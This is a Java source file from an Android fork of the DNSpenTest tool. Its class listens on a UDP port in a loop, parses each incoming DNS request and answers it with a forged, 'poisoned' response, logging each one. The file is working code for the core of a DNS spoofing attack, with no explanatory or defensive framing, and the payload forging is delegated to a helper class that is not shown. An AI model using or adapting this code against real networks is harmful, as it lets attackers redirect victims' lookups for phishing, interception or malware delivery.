/**
 *  This code is part of DNSpenTest (a project of sourceforge.net) and has 
 *  been developed by the Project's members.
 *  Android fork by  https://github.com/Burning-machine  2020 - 2021 .
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 */

package bad.host;

import android.app.Activity;
import android.util.Log;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;



public class ServerKernelProgram extends Activity {
    private DatagramSocket serverS;
    private DatagramPacket packet;
    private AnalizeDNS rq;
    private String TAG = "Fdns";


    private DatagramPacket create_poisoned_pck() {
        rq.poisoner();
        DatagramPacket packet_out = new DatagramPacket(new byte[rq.getpayloadLenght() + 62], rq.getpayloadLenght() + 62);
        packet_out.setAddress(packet.getAddress());
        packet_out.setPort(packet.getPort());
        packet_out.setData(rq.getpayload_FORGED());
        return packet_out;
    }

    private void send_packet(DatagramPacket pck) {
        try {
            serverS.send(pck);
            Log.d(TAG,"POISONED...\n");
        } catch (IOException e) {
            e.printStackTrace();
        }
        serverS.close();
    }

    public void receiveANDanswer(int port, String ip_server, String ip_h2h) throws SocketException {
        serverS = null;
        packet = new DatagramPacket(new byte[512], 512);
        //serverS = new DatagramSocket(port);
        while (true) {
            try {
                serverS = new DatagramSocket(port);
                Log.d(TAG,"wait for request on " + port + "/UDP port...\n\n");
            } catch (SocketException e) {
                e.printStackTrace();
            }
            try {
                serverS.receive(packet);
            } catch (IOException e) {
                e.printStackTrace();
            }
            rq = new AnalizeDNS(packet, ip_h2h);
            rq.parser();
            String msg ="Received data from: "
                    + packet.getAddress().toString().substring(1) + ":" + packet.getPort()
                    + " with length: " + packet.getLength() + " asking for: "+String.valueOf(rq.getURL());
            Log.d(TAG,msg);
            send_packet(create_poisoned_pck());
        }
    }

}
